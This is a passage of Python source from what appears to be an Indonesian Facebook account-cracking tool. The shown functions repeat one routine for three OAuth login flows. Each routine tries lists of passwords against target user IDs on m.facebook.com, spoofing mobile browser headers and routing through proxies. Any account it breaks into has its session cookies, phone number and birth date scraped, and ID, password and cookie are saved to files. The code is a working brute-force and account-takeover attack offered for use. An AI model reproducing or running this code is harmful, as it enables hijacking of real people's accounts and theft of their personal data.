			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=253259228690463&kid_directed_site=0&app_id=253259228690463&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D253259228690463%26cbt%3D1683050049643%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3398ed0a913c2%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%26client_id%3D253259228690463%26display%3Dtouch%26domain%3Dwetv.vip%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwetv.vip%252Fid%26locale%3Den_US%26logger_id%3Df30bf96e550f908%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17db5ef6bc86dc%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%2526frame%253Df1e2d765f47980c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df17db5ef6bc86dc%26domain%3Dwetv.vip%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwetv.vip%252Ff2ae15024f219a8%26relation%3Dopener%26frame%3Df1e2d765f47980c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=253259228690463&kid_directed_site=0&app_id=253259228690463&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D253259228690463%26cbt%3D1683050049643%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3398ed0a913c2%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%26client_id%3D253259228690463%26display%3Dtouch%26domain%3Dwetv.vip%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwetv.vip%252Fid%26locale%3Den_US%26logger_id%3Df30bf96e550f908%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17db5ef6bc86dc%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%2526frame%253Df1e2d765f47980c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df17db5ef6bc86dc%26domain%3Dwetv.vip%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwetv.vip%252Ff2ae15024f219a8%26relation%3Dopener%26frame%3Df1e2d765f47980c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	

def bilibili(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile bilibili [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	#ua = random.choice(ugen3)
	ua = uaasepitgansxc()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=997025131143308&kid_directed_site=0&app_id=997025131143308&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D997025131143308%26cbt%3D1683051094198%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbbb785afd051%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%26client_id%3D997025131143308%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fen%252Fanime%26locale%3Den_US%26logger_id%3Df2a712eaf2f85ec%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2ba17daba7465c%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%2526frame%253Df29e51db62d787%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ba17daba7465c%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff9256cd9f2915c%26relation%3Dopener%26frame%3Df29e51db62d787%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=997025131143308&kid_directed_site=0&app_id=997025131143308&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D997025131143308%26cbt%3D1683051094198%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbbb785afd051%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%26client_id%3D997025131143308%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fen%252Fanime%26locale%3Den_US%26logger_id%3Df2a712eaf2f85ec%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2ba17daba7465c%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%2526frame%253Df29e51db62d787%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ba17daba7465c%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff9256cd9f2915c%26relation%3Dopener%26frame%3Df29e51db62d787%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=997025131143308&kid_directed_site=0&app_id=997025131143308&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D997025131143308%26cbt%3D1683051094198%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbbb785afd051%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%26client_id%3D997025131143308%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fen%252Fanime%26locale%3Den_US%26logger_id%3Df2a712eaf2f85ec%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2ba17daba7465c%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff9256cd9f2915c%2526relation%253Dopener%2526frame%253Df29e51db62d787%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ba17daba7465c%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff9256cd9f2915c%26relation%3Dopener%26frame%3Df29e51db62d787%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuk = convert(ses.cookies.get_dict())
				if 'no' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
					
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: ({nomer})")
					tree.add(f"\r[green]Tanggal anda [green]: ({tgl})")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convertori(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					links = requests.get(f"https://mbasic.facebook.com/{idf}/friends", cookies = {'cookies':kuki}).text
					try:teman = re.findall('<h3 class\=\".*?">(.*?)</h3>', links)[0]
					except:teman = "-"
					try:
						no = ses.get("https://mbasic.facebook.com/settings/sms",cookies={'cookie':kuki})
						req = par(no.text,'html.parser')
						nomer = re.findall('\<span dir="ltr">(.*?)</span>', str(req))[0]
					except:
						nomer = "-"
					try:
						ttl = ses.get('https://mbasic.facebook.com/profile.php',cookies={'cookie':kuki})
						res = par(ttl.text, 'html.parser')
						tgl = re.findall('\<div class="_52jf _52jb _52jh _52jj _5isp">(.*?)</div>',str(res))[0]
					except:
						tgl = '-'
						
					tree = Tree(f"  ")
					tree.add(f"\r[green]ID anda[green]  : {idf}| {teman}[white] ")
					tree.add(f"\r[green]Password[green] : {pw}[white] ")
					tree.add(f"\r[green]Nomor anda   [green]: {nomer}")
					tree.add(f"\r[green]Tanggal anda [green]: {tgl}")
					tree.add(f"\r[red]{ua}[white] ").add(f"\r[green]{kuk}[white] ")
					tree.add(f"\r[green]{posturl()}")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

def vidio(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Vidio [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	#ua = random.choice(ugen3)
	ua = uaasepitgansxc()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%26scope%3Dpublic_profile%252C%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd6dcb3c8-246e-4f23-9b7d-50a0f376d931%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=923560728108869&kid_directed_site=0&app_id=923560728108869&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv4.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D923560728108869%26redirect_uri%3Dhttps%253A%252F%252Fm.vidio.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%26scope%3Dpublic_profile%252C%2Bemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd6dcb3c8-246e-4f23-9b7d-50a0f376d931%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fm.vidio.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfd46b2541619885e08dc8acb685b23fc473eb6a7dc873528%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
